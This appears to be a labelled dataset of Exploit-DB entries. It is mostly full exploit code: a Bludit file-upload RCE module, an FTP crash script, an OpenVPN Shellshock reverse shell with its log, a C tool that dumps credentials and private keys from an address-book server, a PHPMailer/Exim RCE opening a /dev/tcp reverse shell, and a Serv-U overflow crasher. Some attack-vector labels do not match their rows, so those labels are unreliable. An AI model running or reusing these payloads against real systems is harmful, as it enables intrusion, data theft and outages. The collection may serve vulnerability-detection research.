get_uuid(login_badge)     print_status('Retrieving UUID...')     res = send_request_cgi({       'method' => 'GET',       'uri'    => normalize_uri(target_uri.path, 'admin', 'new-content', 'index.php'),       'cookie' => ""BLUDIT-KEY=#{login_badge.bludit_key};""     })      unless res       fail_with(Failure::Unknown, 'Connection timed out')     end      html = res.get_html_document     uuid_element = html.at('input[@name=""uuid""]')     unless uuid_element       fail_with(Failure::Unknown, 'No UUID found in admin/new-content/')     end      uuid_val = uuid_element.attributes['value']     unless uuid_val && uuid_val.respond_to?(:value)       fail_with(Failure::Unknown, 'No UUID value')     end      uuid_val.value   end    def upload_file(login_badge, uuid, content, fname)     print_status(""Uploading #{fname}..."")      data = Rex::MIME::Message.new     data.add_part(content, 'image/png', nil, ""form-data; name=\""images[]\""; filename=\""#{fname}\"""")     data.add_part(uuid, nil, nil, 'form-data; name=""uuid""')     data.add_part(login_badge.csrf_token, nil, nil, 'form-data; name=""tokenCSRF""')      res = send_request_cgi({       'method'  => 'POST',       'uri'     => normalize_uri(target_uri.path, 'admin', 'ajax', 'upload-images'),       'ctype'   => ""multipart/form-data; boundary=#{data.bound}"",       'cookie'  => ""BLUDIT-KEY=#{login_badge.bludit_key};"",       'headers' => {'X-Requested-With' => 'XMLHttpRequest'},       'data'    => data.to_s     })      unless res       fail_with(Failure::Unknown, 'Connection timed out')     end   end    def upload_php_payload_and_exec(login_badge)     # From: /var/www/html/bludit/bl-content/uploads/pages/5821e70ef1a8309cb835ccc9cec0fb35/     # To: /var/www/html/bludit/bl-content/tmp     uuid = get_uuid(login_badge)     php_payload = get_php_payload     upload_file(login_badge, '../../tmp', php_payload.payload, php_payload.name)      # On the vuln app, this line occurs first:     # Filesystem::mv($_FILES['images']['tmp_name'][$uuid], PATH_TMP.$filename);     # Even though there is a file extension check, it won't really stop us     # from uploading the .htaccess file.     htaccess = <<~HTA     RewriteEngine off     AddType application/x-httpd-php .png     HTA     upload_file(login_badge, uuid, htaccess, "".htaccess"")     register_file_for_cleanup('.htaccess')      print_status(""Executing #{php_payload.name}..."")     send_request_cgi({       'method' => 'GET',       'uri'    => normalize_uri(target_uri.path, 'bl-content', 'tmp', php_payload.name)     })   end    def get_php_payload     @php_payload ||= PhpPayload.new(get_write_exec_payload(unlink_self: true))   end    def get_login_badge(res)     cookies = res.get_cookies     bludit_key = cookies.scan(/BLUDIT\-KEY=(.+);/i).flatten.first || ''      html = res.get_html_document     csrf_element = html.at('input[@name=""tokenCSRF""]')     unless csrf_element       fail_with(Failure::Unknown, 'No tokenCSRF found')     end      csrf_val = csrf_element.attributes['value']     unless csrf_val && csrf_val.respond_to?(:value)       fail_with(Failure::Unknown, 'No tokenCSRF value')     end      LoginBadge.new(datastore['BLUDITUSER'], datastore['BLUDITPASS'], csrf_val.value, bludit_key)   end    def do_login     res = send_request_cgi({       'method' => 'GET',       'uri'    => normalize_uri(target_uri.path, 'admin', 'index.php')     })      unless res       fail_with(Failure::Unknown, 'Connection timed out')     end      login_badge = get_login_badge(res)     res = send_request_cgi({       'method'    => 'POST',       'uri'       => normalize_uri(target_uri.path, 'admin', 'index.php'),       'cookie'    => ""BLUDIT-KEY=#{login_badge.bludit_key};"",       'vars_post' =>         {           'tokenCSRF' => login_badge.csrf_token,           'username'  => login_badge.username,           'password'  => login_badge.password         }     })      unless res       fail_with(Failure::Unknown, 'Connection timed out')     end      # A new csrf value is generated, need to update this for the upload     if res.headers['Location'].to_s.include?('/admin/dashboard')       store_valid_credential(user: login_badge.username, private: login_badge.password)       res = send_request_cgi({         'method' => 'GET',         'uri'    => normalize_uri(target_uri.path, 'admin', 'dashboard', 'index.php'),         'cookie' => ""BLUDIT-KEY=#{login_badge.bludit_key};"",       })        unless res         fail_with(Failure::Unknown, 'Connection timed out')       end        new_csrf = res.body.scan(/var tokenCSRF = ""(.+)"";/).flatten.first       login_badge.csrf_token = new_csrf if new_csrf       return login_badge     end      fail_with(Failure::NoAccess, 'Authentication failed')   end    def exploit     login_badge = do_login     print_good(""Logged in as: #{login_badge.username}"")     upload_php_payload_and_exec(login_badge)   end end",abuse the uuid parameter in the image upload feature,1
44221,"SEGGER embOS/IP FTP Server 3.22 - Denial of Service [+] Credits: John Page (aka hyp3rlinx)		 [+] Website: hyp3rlinx.altervista.org [+] Source:  http://hyp3rlinx.altervista.org/advisories/SEGGER-embOS-FTP-SERVER-v3.22-FTP-COMMANDS-DENIAL-OF-SERVICE.txt [+] ISR: Apparition Security               Vendor: ============= www.segger.com   Product: =========== embOS/IP FTP Server v3.22   Vulnerability Type: =================== FTP Commands Denial Of Service    CVE Reference: ============== CVE-2018-7449   Security Issue: ================ SEGGER embOS/IP FTP Server 3.22 allows remote attackers to cause a denial of service (daemon crash) via an invalid LIST, STOR, or RETR command.  STOR 666\r\n LIST\r\n RETR '+'..\\'*8+'Windows\system.ini\r\n   TELNET x.x.x.x 21  220 Welcome to embOS/IP FTP server USER anonymous 331 Password required. PASS anonymous 230 User logged in, proceed. STOR Bye!  CRASH!!!    Exploit/POC: ============= import socket,time  VICTIM=raw_input('[+]Segger v3.22 FTP Server IP > ') USR='anonymous' PWD='anonymous' CMD=""STOR Bye!\r\n""  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((VICTIM, 21))  print s.recv(1024) # Recieve FTP Banner time.sleep(1) s.send(""USER "" + USR+ ""\r\n"")  print s.recv(1024)  time.sleep(1) s.send(""PASS ""+ PWD+""\r\n"") # print s.recv(1024)  time.sleep(1) s.send(CMD) print 'Sent %s' % CMD s.close()      Network Access: =============== Remote    Severity: ========= Medium    Disclosure Timeline: ============================= Vendor Notification:  February 17, 2018 Vendor acknowledgement: February 19, 2018 Vendor released fixed version v3.22a : February 23, 2018 March 1, 2018 : Public Disclosure    [+] Disclaimer The information contained within this advisory is supplied ""as-is"" with no warranties or guarantees of fitness of use or otherwise. Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information or exploits by the author or elsewhere. All content (c).","an invalid LIST, STOR, or RETR command",1
34879,"OpenVPN 2.2.29 - 'Shellshock' Remote Command Injection # Exploit Title: ShellShock OpenVPN Exploit  # Date: Fri Oct  3 15:48:08 EDT 2014  # Exploit Author: hobbily AKA @fj33r  # Version: 2.2.29  # Tested on: Debian Linux  # CVE : CVE-2014-6271  #Probably should of submitted this the day I tweeted it. ### server.conf port 1194 proto udp dev tun client-cert-not-required auth-user-pass-verify /etc/openvpn/user.sh via-env tmp-dir ""/etc/openvpn/tmp"" ca ca.crt cert testing.crt key testing.key  # This file should be kept secret dh dh1024.pem server 10.8.0.0 255.255.255.0 keepalive 10 120 comp-lzo user nobody group nogroup persist-key persist-tun client-cert-not-required plugin /usr/lib/openvpn/openvpn-auth-pam.so login script-security 3 status openvpn-status.log verb 3  ### user.sh #!/bin/bash echo ""$username"" echo ""$password""  ### start server openvpn server.con  ### terminal 1 nc -lp 4444  ### terminal 2 sudo openvpn --client --remote 10.10.0.52 --auth-user-pass --dev tun --ca ca.cert --auth-nocache --comp-lzo  ### username && password were both shellshocked just incase user:() { :;};/bin/bash -i >& /dev/tcp/10.10.0.56/4444 0>&1 & pass:() { :;};/bin/bash -i >& /dev/tcp/10.10.0.56/4444 0>&1 &  ### log Mon Sep 29 20:56:56 2014 NOTE: the current --script-security setting may allow this configuration to call user-defined scripts Mon Sep 29 20:56:56 2014 PLUGIN_INIT: POST /usr/lib/openvpn/openvpn-auth-pam.so '[/usr/lib/openvpn/openvpn-auth-pam.so] [login]' intercepted=PLUGIN_AUTH_USER_PASS_VERIFY Mon Sep 29 20:56:56 2014 Diffie-Hellman initialized with 1024 bit key Mon Sep 29 20:56:56 2014 WARNING: POTENTIALLY DANGEROUS OPTION --client-cert-not-required may accept clients which do not present a certificate Mon Sep 29 20:56:56 2014 TLS-Auth MTU parms [ L:1542 D:138 EF:38 EB:0 ET:0 EL:0 ] Mon Sep 29 20:56:56 2014 Socket Buffers: R=[163840->131072] S=[163840->131072] Mon Sep 29 20:56:56 2014 ROUTE default_gateway=10.10.0.1 Mon Sep 29 20:56:56 2014 TUN/TAP device tun0 opened Mon Sep 29 20:56:56 2014 TUN/TAP TX queue length set to 100 Mon Sep 29 20:56:56 2014 do_ifconfig, tt->ipv6=0, tt->did_ifconfig_ipv6_setup=0 Mon Sep 29 20:56:56 2014 /sbin/ifconfig tun0 10.8.0.1 pointopoint 10.8.0.2 mtu 1500 Mon Sep 29 20:56:56 2014 /sbin/route add -net 10.8.0.0 netmask 255.255.255.0 gw 10.8.0.2 Mon Sep 29 20:56:56 2014 Data Channel MTU parms [ L:1542 D:1450 EF:42 EB:135 ET:0 EL:0 AF:3/1 ] Mon Sep 29 20:56:56 2014 GID set to nogroup Mon Sep 29 20:56:56 2014 UID set to nobody Mon Sep 29 20:56:56 2014 UDPv4 link local (bound): [undef] Mon Sep 29 20:56:56 2014 UDPv4 link remote: [undef] Mon Sep 29 20:56:56 2014 MULTI: multi_init called, r=256 v=256 Mon Sep 29 20:56:56 2014 IFCONFIG POOL: base=10.8.0.4 size=62, ipv6=0 Mon Sep 29 20:56:56 2014 Initialization Sequence Completed Mon Sep 29 20:57:54 2014 MULTI: multi_create_instance called Mon Sep 29 20:57:54 2014 10.10.0.56:1194 Re-using SSL/TLS context Mon Sep 29 20:57:54 2014 10.10.0.56:1194 LZO compression initialized Mon Sep 29 20:57:54 2014 10.10.0.56:1194 Control Channel MTU parms [ L:1542 D:138 EF:38 EB:0 ET:0 EL:0 ] Mon Sep 29 20:57:54 2014 10.10.0.56:1194 Data Channel MTU parms [ L:1542 D:1450 EF:42 EB:135 ET:0 EL:0 AF:3/1 ] Mon Sep 29 20:57:54 2014 10.10.0.56:1194 Local Options hash (VER=V4): '530fdded' Mon Sep 29 20:57:54 2014 10.10.0.56:1194 Expected Remote Options hash (VER=V4): '41690919' Mon Sep 29 20:57:54 2014 10.10.0.56:1194 TLS: Initial packet from [AF_INET]10.10.0.56:1194, sid=644ea55a 5f832b02 AUTH-PAM: BACKGROUND: user '() { :;};/bin/bash -i >& /dev/tcp/10.10.0.56/4444 0>&1 &' failed to authenticate: Error in service module Mon Sep 29 20:57:57 2014 10.10.0.56:1194 PLUGIN_CALL: POST /usr/lib/openvpn/openvpn-auth-pam.so/PLUGIN_AUTH_USER_PASS_VERIFY status=1 Mon Sep 29 20:57:57 2014 10.10.0.56:1194 PLUGIN_CALL: plugin function PLUGIN_AUTH_USER_PASS_VERIFY failed with status 1: /usr/lib/openvpn/openvpn-auth-pam.so _________/bin/bash_-i____/dev/tcp/10.10.0.56/4444_0__1__  Mon Sep 29 20:57:57 2014 10.10.0.56:1194 TLS Auth Error: Auth Username/Password verification failed for peer Mon Sep 29 20:57:57 2014 10.10.0.56:1194 Control Channel: TLSv1, cipher TLSv1/SSLv3 DHE-RSA-AES256-SHA Mon Sep 29 20:57:57 2014 10.10.0.56:1194 [] Peer Connection Initiated with [AF_INET]10.10.0.56:1194 Mon Sep 29 20:57:59 2014 10.10.0.56:1194 PUSH: Received control message: 'PUSH_REQUEST' Mon Sep 29 20:57:59 2014 10.10.0.56:1194 Delayed exit in 5 seconds Mon Sep 29 20:57:59 2014 10.10.0.56:1194 SENT CONTROL [UNDEF]: 'AUTH_FAILED' (status=1) Mon Sep 29 20:58:01 2014 read UDPv4 [ECONNREFUSED]: Connection refused (code=111) Mon Sep 29 20:58:04 2014 10.10.0.56:1194 SIGTERM[soft,delayed-exit] received, client-instance exiting  ### nc listener nobody@debian:/etc/openvpn$ id id uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup) #shoutouts to Fredrik Str�mberg for the post he made on ycombinator",a specially crafted .crt file,1
2699,"EFS Easy Address Book Web Server 1.2 - Remote File Stream /* ========================================================================== 0-day Alternative File Stream Exploit for EFS Easy Address Book Web Server =========================================================================== EFS' Easy Address Book Web Server is vulnerable to file stream exploits which can be exploited remotely to access files without authentification.  This could lead to server compromise and/or sensitive information disclosure.   0-day Easy Address Book Web Server Alternative File Stream Exploit Discovered and Coded by Greg Linares ==> GLinares.code [at] gmail [dot] com This tool demonstrates EFS' Easy Address Book Web Server Vulnerability to Alternative Data Stream GET requests which allow unauthorized users to download server critical files.  Discovered and Reported: 11-1-2006  Usage: exploit <hostname/IP> [port 80=default] [Method see below]  --------PoC Methods:----- 1 = Gather all login username and passwords and email addresses. 2 = Gather Private RSA Keys and Certificates for server. 3 = Gather All Addressbooks and Contact Info on the server. 4 = Gather Server Settings File and SMTP server info.    */  #include <stdio.h> #include <stdlib.h> #include <windows.h>		/* Win32 API */ #include <wininet.h>		/* WinInet API */ int mthd; unsigned short httpport; char exploit[512], exploit2[512], exploit3[512], exploit4[512], exploit5[512], exploit6[512]; char logmsg[512]; char endmsg[512]; HINTERNET inet;			/* WinInet Internet Handle */ FILE *file;  void ExploitHTTP (HINTERNET inet, const char *host, const char *exp) {    	HINTERNET connection;		/* Connection Handle */     HINTERNET request;			/* Request Handle */     unsigned long flags;		/* HttpOpenRequest Flags */  	char buffer[BUFSIZ];     unsigned long len;   	printf(""HOST: %s\n"", host); 	printf(""PORT: %i\n"", httpport);  	if ((connection = InternetConnect(inet, host, httpport, 				      NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0)) 	    == NULL) 	{ 		printf(""Failed to Connect...Exiting\n""); 		InternetCloseHandle(inet); 		fclose(file); 		exit(1); 	}  	flags = INTERNET_FLAG_NO_AUTH | INTERNET_FLAG_NO_AUTO_REDIRECT | 	    INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES | 	    INTERNET_FLAG_RELOAD;  	strcat(exp, ""%3A%3A%24%44%41%54%41"");  	request = HttpOpenRequest(connection, ""GET"", exp, ""HTTP/1.0"", NULL, NULL, flags, 0); 	if (request == NULL) 	{ 		printf(""HTTP Open Request failed....Exiting\n""); 		InternetCloseHandle(connection); 		InternetCloseHandle(inet); 		fclose(file); 		exit(1); 	} 	if (!HttpSendRequest(request, NULL, 0, NULL, 0)) 	{ 		printf(""HTTP Send Request failed....Exiting\n""); 		InternetCloseHandle(request); 		InternetCloseHandle(connection); 		InternetCloseHandle(inet); 		fclose(file); 		exit(1); 	} 	printf(""Exploit Sent...Dumping HTTP Return Packet...""); 	sleep(1000);  	while (InternetReadFile(request, buffer, sizeof buffer, &len) && len > 0) 	{ 		fwrite(buffer, len, 1, file); 		if (fwrite(buffer, len, 1, stdout) < 1) 		{ 				printf(""Error Outputting HTTP Return Packet\n""); 		} 	} 	InternetCloseHandle(request);     InternetCloseHandle(connection); }   int main (int argc, char *argv[]) {  	printf(""\n=========================================================================\n""); 	printf(""0-day Easy Address Book Web Server Alternative File Stream Exploit\n""); 	printf(""Discovered and Coded by Greg Linares ==> GLinares.code [at] gmail [dot] com\n""); 	printf(""This tool demonstrates EFS Address Book Server's Vulnerability to Alternative\n""); 	printf(""Data Stream GET requests which allow unauthorized users to download server \n""); 	printf(""critical files.\n""); 	printf(""Discovered and Reported: 11-1-2006\n""); 	printf(""\nUsage: %s <hostname/IP> [port 80=default] [Method see below]\n"", argv[0]); 	printf(""--------PoC Methods:-----\n""); 	printf(""1 = Gather all login username and passwords and email addresses.[Default]\n""); 	printf(""2 = Gather Private RSA Keys and Certificates for server.\n""); 	printf(""3 = Gather All Address Books and Contact Information on the server\n""); 	printf(""4 = Gather Server Settings File and SMTP server info.\n""); 	printf(""============================================================================\n"");       inet = InternetOpen(""ESF Exp"", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);     if (inet == NULL) 	{ 		printf(""Error accessing InternetOpen API - Exiting...\n""); 		exit(1); 	} 	if (argc < 2) 	{ 		printf(""Invalid # of arguments...Exiting\n""); 		exit(1); 	} 	if (atoi(argv[3]) > 4) 	{ 		mthd = 1; 	} 	if (atoi(argv[3]) <= 0) 	{ 		mthd = 1; 	} 	mthd = atoi(argv[3]);  	/* Set Up Exploits */ 	switch(mthd) 	{     	case 1: 			file = fopen(""Accounts.txt"",""a+""); 			sprintf(exploit, ""%s"", ""%2F%61%64%64%72%62%6F%6F%6B%2F%75%73%65%72%2E%73%64%62""); 			sprintf(endmsg, ""%s"", ""\n\n\nResults Dumped to Accounts.txt\n""); 			break; 		case 2: 			file = fopen(""RSAKeys.txt"", ""a+""); 			sprintf(exploit, ""%s"", ""%53%65%72%76%65%72%4B%65%79%2E%70%65%6D""); 			sprintf(endmsg, ""%s"", ""\n\n\nResults Dumped to RSAKeys.txt\n""); 			break; 		case 3: 			file = fopen(""AddrBooks.txt"", ""a+""); 			sprintf(exploit, ""%s"", ""%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%31%2E%73%64%62""); 			sprintf(endmsg, ""%s"", ""\n\n\nResults Dumped to Messages.txt\n""); 			break; 		case 4: 			file = fopen(""Server.txt"", ""a+""); 			sprintf(exploit, ""%s"", ""%6F%70%74%69%6F%6E%2E%69%6E%69""); 			sprintf(endmsg, ""%s"", ""\n\n\nResults Dumped to Server.txt\n""); 			break; 	}    	sprintf(logmsg, ""%s"", argv[1]); 	sprintf(logmsg, ""%s"", ""\r\n\r\n\r\n""); 	fwrite(logmsg, strlen(logmsg), 1, file); 	httpport = atoi(argv[2]); 	ExploitHTTP(inet, argv[1], exploit); 	if (mthd == 3) 	{ 		printf(""\n\n Sending 2nd Exploit...\n""); 		strcat(exploit2, ""%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%32%2E%73%64%62""); 		ExploitHTTP(inet, argv[1], exploit2); 		printf(""\n\n Sending 3rd Exploit...\n""); 		strcat(exploit3, ""%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%33%2E%73%64%62""); 		ExploitHTTP(inet, argv[1], exploit3); 		printf(""\n\n Sending 4th Exploit...\n""); 		strcat(exploit4, ""%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%5F%75%73%65%72%2E%73%64%62""); 		ExploitHTTP(inet, argv[1], exploit4); 		printf(""\n\n Sending final Exploit...\n""); 		strcat(exploit5, ""%2F%61%64%64%72%62%6F%6F%6B%2F%61%64%64%72%62%6F%6F%6B%67%72%6F%75%70%2E%73%64%62""); 		ExploitHTTP(inet, argv[1], exploit5); 	} 	if (mthd == 2) 	{ 		printf(""\n\n Sending 2nd Exploit...\n""); 		strcat(exploit2, ""%53%65%72%76%65%72%43%65%72%74%2E%70%65%6D""); 		ExploitHTTP(inet, argv[1], exploit2); 		printf(""\n\n Sending 3rd Exploit...\n""); 		strcat(exploit3, ""%52%6F%6F%74%43%65%72%74%2E%70%65%6D""); 		ExploitHTTP(inet, argv[1], exploit3); 		printf(""\n\n Sending 4th Exploit...\n""); 		strcat(exploit4, ""%65%66%73%77%73%5F%6B%65%79%2E%70%65%6D""); 		ExploitHTTP(inet, argv[1], exploit4); 		printf(""\n\n Sending 5th Exploit...\n""); 		strcat(exploit5, ""%65%66%73%77%73%5F%72%65%71%2E%70%65%6D""); 		ExploitHTTP(inet, argv[1], exploit5); 		printf(""\n\n Sending final Exploit...\n""); 		strcat(exploit6, ""%65%66%73%77%73%5F%72%61%6E%64%2E%74%78%74""); 		ExploitHTTP(inet, argv[1], exploit6); 	}  	fclose(file);     Sleep(500);     InternetCloseHandle(inet); 	printf(""\n\n===================================================\n""); 	printf(""%s\n"", endmsg); 	printf(""Proof Of Concept Exploit by Greg Linares\n""); 	printf(""Send Comments/Concerns/Questions/Etc to GLinares.code [at] gmail [dot] com\n"");     return 0;  }  // milw0rm.com [2006-11-01]",malicious users,1
42221,"PHPMailer < 5.2.20 with Exim MTA - Remote Code Execution #!/usr/bin/python # # Exploit Title: [RCE for PHPMailer < 5.2.20 with Exim MTA] # Date: [16/06/2017] # Exploit Author: [@phackt_ul] # Software Link: [https://github.com/PHPMailer/PHPMailer] # Version: [< 5.2.20] # Tested on: [Debian x86/x64] # CVE : [CVE-2016-10033,CVE-2016-10074,CVE-2016-10034,CVE-2016-10045] # # @phackt_ul - https://phackt.com #  # Find the last updated version here: https://raw.githubusercontent.com/phackt/pentest/master/exploits/rce_phpmailer_exim.py #  # All credits go to Dawid Golunski (@dawid_golunski) - https://legalhackers.com # and its research on PHP libraries vulns # # PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033) # PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass # SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074) # Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034) # # ExploitBox project: # https://ExploitBox.io # # Full advisory URL: # https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html # https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html # http://pwnscriptum.com/ # # -------------------------------------------------------- # Enhanced for Exim MTA #  # N.B:  # The original author's method in the PHPMailer POC (for sendmail MTA) uses the RFC 3696  # double quotes technique associated with the -oQ -X options to log mailer traffic and to create  # the backdoor. This technique is not facing some payload size issues because the payload  # was in the email body. # # For Exim: # The original author's Wordpress 4.6 POC for Exim combines the comment syntax (RFC 822) # and the Exim expansion mode techniques. The use of substr on spool_directory and tod_log  # expansion variables in order to bypass the PHP mail() escaping may leads to large  # email addresses payloads. However the comment syntax validateAddress() technique does not  # face any size limitation but its use can not be applied for PHPMailer < 5.2.20. # # Goal: # The use of double quotes validateAdresse() technique (and it's patch bypass for PHPMailer < 5.5.20)  # combined with the Exim expansion mode technique may leads to large payloads quickly facing addresses # size limit here (260 chars) and so not matching the pcre8 regexp in the validateAddress() function. # We are now base64 encoding the command in order to bypass escapeshellcmd() and allowing larger payloads. #  # # Usage: # ./rce_phpmailer_exim4.py -url http://victim/phpmailer/ -cf contact_form.php -ip 192.168.1.109 -p 1337 # # # Requirements: # - Vulnerable PHP libraries # - Exim MTA Agent # #  # Disclaimer: # For testing purposes only on your local machine - http://pwnscriptum.com/PwnScriptum_PHPMailer_PoC_contactform.zip  import argparse import urllib import urllib2 import base64  # Prepare command for Exim expansion mode in order  def prepare_cmd(cmd):     return '${run{${base64d:%s}}}' % base64.b64encode(cmd)  # Send Request method def send_request(req):     try:         urllib2.urlopen(req)     except urllib2.HTTPError, e:         print ""[!] Got HTTP error: [%d] when trying to reach "" % e.code + req.get_full_url() + "" - Check the URL!\n\n""         exit(3)     except urllib2.URLError, err:         print ""[!] Got the '%s' error when trying to reach "" % str(err.reason) + req.get_full_url() + "" - Check the URL!\n\n""         exit(4)  # Parse input args parser = argparse.ArgumentParser(prog='rce_phpmailer_exim4.py', description='PHPMailer / Zend-mail / SwiftMailer - RCE Exploit for Exim4 based on LegalHackers sendmail version') parser.add_argument('-url', dest='WEBAPP_BASE_URL', required=True,  help='WebApp Base Url') parser.add_argument('-cf',  dest='CONTACT_SCRIPT',  required=True,  help='Contact Form scriptname') parser.add_argument('-ip',  dest='ATTACKER_IP',    required=True,  help='Attacker IP for reverse shell') parser.add_argument('-p',   dest='ATTACKER_PORT',  required=False, help='Attackers Port for reverse shell', default=""8888"") parser.add_argument('--post-action', dest='POST_ACTION',  required=False, help='Overrides POST ""action"" field name',         default=""send"") parser.add_argument('--post-name',   dest='POST_NAME',    required=False, help='Overrides POST ""name of sender"" field name', default=""name"") parser.add_argument('--post-email',  dest='POST_EMAIL',   required=False, help='Overrides POST ""email"" field name',          default=""email"") parser.add_argument('--post-msg',    dest='POST_MSG',     required=False, help='Overrides POST ""message"" field name',        default=""msg"") args = parser.parse_args()  CONTACT_SCRIPT_URL = args.WEBAPP_BASE_URL + args.CONTACT_SCRIPT  # Show params print """"""[+] Setting vars to: \n WEBAPP_BASE_URL      = [%s] CONTACT_SCRIPT       = [%s] ATTACKER_IP          = [%s] ATTACKER_PORT        = [%s] POST_ACTION          = [%s] POST_NAME            = [%s] POST_EMAIL           = [%s] POST_MSG             = [%s] """""" % (args.WEBAPP_BASE_URL, args.CONTACT_SCRIPT, args.ATTACKER_IP, args.ATTACKER_PORT, args.POST_ACTION, args.POST_NAME, args.POST_EMAIL, args.POST_MSG)  # Ask for mail library print ""[+] Choose your target / payload: "" print ""\033[1;34m"" print ""[1] PHPMailer < 5.2.18 Remote Code Execution (CVE-2016-10033)"" print ""    SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)"" print ""    Zend Framework / zend-mail < 2.4.11 - Remote Code Execution (CVE-2016-10034)\n"" print ""[2] PHPMailer < 5.2.20 Remote Code Execution (CVE-2016-10045) - escapeshellarg() bypass"" print ""\033[0m""  try:     target = int(raw_input('[?] Select target [1-2]: ')) except ValueError:     print ""Not a valid choice. Exiting\n""     exit(2)  if (target>2):     print ""No such target. Exiting\n""     exit(3)  ################################ # Payload ################################ cmd = ""/bin/bash -c '0<&196;exec 196<>/dev/tcp/%s/%s;nohup sh <&196 >&196 2>&196 &'"" % (args.ATTACKER_IP, args.ATTACKER_PORT) prepared_cmd = prepare_cmd(cmd)  payload = '""a\\"" -be ' + prepared_cmd + ' ""@a.co'  # Update payloads for PHPMailer bypass (PHPMailer < 5.2.20) if target == 2:     payload = ""\""a\\' -be "" + prepared_cmd + "" \""@a.co""  ################################ # Attack episode # This step will execute the reverse shell ################################  # Form fields post_fields = {'action': ""%s"" % args.POST_ACTION, ""%s"" % args.POST_NAME: 'Jas Fasola', ""%s"" % args.POST_EMAIL: payload, ""%s"" % args.POST_MSG: 'Really important message'}  # Print relevant information print ""\n[+] Executing command on victim server\n"" print '[!] command: [%s]' % cmd print '[!] payload: [%s]' % payload print '[!] post_fields: [%s]\n' % str(post_fields)  data = urllib.urlencode(post_fields) req = urllib2.Request(CONTACT_SCRIPT_URL, data) send_request(req)  print ""\033[1;32m[+] You should check your listener and cross the fingers ;)\033[0m\n""",a specially crafted .zip file,1
23761,"RhinoSoft Serv-U FTPd Server 3/4/5 - 'MDTM' Time Argument Buffer Overflow (2) // source: https://www.securityfocus.com/bid/9751/info   Serv-U FTP Server has been reported prone to a remote stack based buffer overflow vulnerability when handling time zone arguments passed to the MDTM FTP command.   The problem exists due to insufficient bounds checking. Ultimately an attacker may leverage this issue to have arbitrary instructions executed in the context of the SYSTEM user.  /* serv-u-mdtm-expl.c - Serv-U ""MDTM"" buffer overflow PoC DoS exploit.  *  * This program will send an overly large filename parameter when calling  * the Serv-U FTP MDTM command.  Although arbitrary code execution is  * possible upon successful execution of this vulnerability, the vendor has  * not yet released a patch, so releasing such an exploit could be disastrous  * in the hands of script kiddies.  I might release a full exploit to the  * public when a patch/fix is issued by the vendor of Serv-U.  This PoC  * exploit will simply crash the Serv-U server.  *  * This vulnerability was discovered by bkbll, you can read his advisory on  * the issue here: <http://www.cnhonker.com/advisory/serv-u.mdtm.txt>  *  * This vulnerability requires a valid login and password to exploit!  This  * PoC does not check to see if you supplied a correct login and password.  *  * I do not take responsibility for this code.  *  * -shaun2k2  */  #include <stdio.h> #include <stdlib.h> #include <sys/socket.h> #include <sys/types.h> #include <netdb.h> #include <netinet/in.h>  int main(int argc, char *argv[]) {         if(argc < 5) {                 printf(""Serv-U 'MDTM' buffer overflow DoS exploit.\n"");                 printf(""by shaun2k2 - <shaunige@yahoo.co.uk>.\n\n"");                 printf(""Usage: %s <host> <port> <login> <password>\n"", argv[0]);                 exit(-1);         }          int sock;         char explbuf[6032];         char loginbuf[100];         char passwdbuf[100];         char bigbuf[6000];         struct sockaddr_in dest;         struct hostent *he;          /* lookup IP address of supplied hostname. */         if((he = gethostbyname(argv[1])) == NULL) {                 printf(""Couldn't resolve %s!\n"", argv[1]);                 exit(-1);         }          /* create socket. */         if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {                 perror(""socket()"");                 exit(-1);         }          /* fill in address struct. */         dest.sin_family = AF_INET;         dest.sin_port = htons(atoi(argv[2]));         dest.sin_addr = *((struct in_addr *)he->h_addr);          printf(""Serv-U 'MDTM' buffer overflow DoS exploit.\n"");         printf(""by shaun2k2 - <shaunige@yahoo.co.uk>.\n\n"");          printf(""Crafting exploit buffer...\n\n"");         /* craft exploit buffers. */         memset(bigbuf, 'a', 6000);         sprintf(loginbuf, ""USER %s\n"", argv[3]);         sprintf(passwdbuf, ""PASS %s\n"", argv[4]);         sprintf(explbuf, ""MDTM 20031111111111+%s\r\n"", bigbuf);           printf(""[+] Connecting...\n"");         if(connect(sock, (struct sockaddr *)&dest, sizeof(struct sockaddr)) < 0) {                 perror(""connect()"");                 exit(-1);         }          printf(""[+] Connected!\n\n"");          printf(""[+] Sending exploit buffers...\n"");         sleep(1); /* give the serv-u server time to sort itself out. */         send(sock, loginbuf, strlen(loginbuf), 0);         sleep(2); /* wait for 2 secs. */         send(sock, passwdbuf, strlen(passwdbuf), 0);         sleep(2); /* wait before sending large MDTM command. */         send(sock, explbuf, strlen(explbuf), 0);         sleep(1); /* wait before closing the socket. */         printf(""[+] Exploit buffer sent!\n\n"");          close(sock);          printf(""[+] Done!  Check if the Serv-U server has crashed.\n"");          return(0); }",send an overly large filename parameter when calling the ServU FTP MDTM command,1
